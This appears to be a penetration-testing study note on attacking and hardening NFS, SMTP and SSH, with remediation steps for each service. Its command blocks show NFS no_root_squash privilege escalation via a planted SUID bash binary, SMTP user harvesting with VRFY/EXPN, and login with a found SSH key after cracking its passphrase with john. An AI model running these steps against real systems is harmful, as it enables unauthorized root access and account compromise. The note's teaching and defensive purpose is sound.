# 03 - Network Services II: NFS, SMTP & SSH Enumeration & Exploitation

## Overview
This assessment documents the architecture, attack vectors, and defensive hardening for three critical infrastructure services: **NFS (Port 2049)**, **SMTP (Port 25)**, and **SSH (Port 22)**.

---

## 1. NFS (Network File System)

### Architecture & Mechanics
* **Default Port:** `2049` (TCP/UDP), often coordinating with `rpcbind` on Port `111`.
* **Purpose:** Allows a client system to access and mount remote directory trees over a network as if they were local storage.
* **Security Vector:** Misconfigured `/etc/exports` file, permissive IP whitelisting, and the `no_root_squash` directive.

### Enumeration & Mounting
```bash
# 1. Enumerate remote mountable shares (exports)
showmount -e <TARGET_IP>

# 2. Create local mount directory and attach remote share
sudo mkdir -p /tmp/nfs_mount
sudo mount -t nfs <TARGET_IP>:/<EXPORTED_SHARE> /tmp/nfs_mount -nolock

# 3. Inspect mounted files
ls -la /tmp/nfs_mount
```

### Exploitation: `no_root_squash` Privilege Escalation
By default, NFS performs *root squashing*—mapping remote `root` actions to an unprivileged account (`nobody`/`nogroup`). When `no_root_squash` is enabled, an attacker with local root access on their own machine retains root execution privileges on the mounted share.

```bash
# On your local machine (as root), create a SUID bash binary inside the mount:
sudo cp /bin/bash /tmp/nfs_mount/rootbash
sudo chmod +xs /tmp/nfs_mount/rootbash

# On the target victim machine:
# Execute the dropped binary with preserved privileges
/path/to/share/rootbash -p
# Result: Escalated root shell (#)
```

### Remediation
1. Ensure `root_squash` is explicitly enabled in `/etc/exports`.
2. Restrict export access to specific, verified internal IP addresses rather than open subnets or wildcards (`*`).
3. Set the `nosuid` mount option on shared partitions to prevent binary execution abuse.

---

## 2. SMTP (Simple Mail Transfer Protocol)

### Architecture & Mechanics
* **Default Port:** `25` (Plaintext server-to-server relay), `587` (Submission), `465` (SMTPS).
* **Purpose:** Transporting outbound email across IP networks.
* **Security Vectors:** User enumeration commands (`VRFY`, `EXPN`) and open relay misconfigurations allowing spam/phishing abuse.

### Enumeration & User Harvesting
```bash
# 1. Connect via Netcat or Telnet to interact with the SMTP banner
nc -vn <TARGET_IP> 25

# 2. Issue handshake and verify accounts
HELO attacker.local
VRFY root          # 250: User exists / 550: String does not match
VRFY admin
EXPN support-team  # Expands mailing list members
QUIT
```

* **Automated SMTP Scanning:**
  ```bash
  # Nmap script scanning for user enumeration
  nmap -p 25 --script smtp-enum-users <TARGET_IP>

  # SMTP user enumeration via smtp-user-enum
  smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <TARGET_IP>
  ```

### Remediation
1. Disable unnecessary informational commands (`disable_vrfy_command = yes` in Postfix).
2. Restrict relaying strictly to authenticated internal users to avoid functioning as an open relay.
3. Enforce STARTTLS for encrypted transit.

---

## 3. SSH (Secure Shell)

### Architecture & Mechanics
* **Default Port:** `22` (TCP).
* **Purpose:** Cryptographically secured command-line session access, replacing unencrypted protocols like Telnet and Rlogin.
* **Security Vectors:** Stolen/unprotected private keys (`id_rsa`), overly permissive key file permissions, and weak credentials prone to brute-forcing.

### Key Authentication Auditing & Login
When an attacker discovers an exposed `id_rsa` file via misconfigured file shares (NFS, SMB, or web directories):

```bash
# 1. Fix local private key permissions (SSH refuses keys that are too open)
chmod 600 id_rsa

# 2. Authenticate using the identity file
ssh -i id_rsa <username>@<TARGET_IP>

# 3. If the key is encrypted with a passphrase, crack it locally:
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

### Remediation
1. Disable root login over SSH (`PermitRootLogin no` in `/etc/ssh/sshd_config`).
2. Enforce public-key authentication only (`PasswordAuthentication no`).
3. Protect private keys with strong passphrases and strict filesystem permissions (`600`).
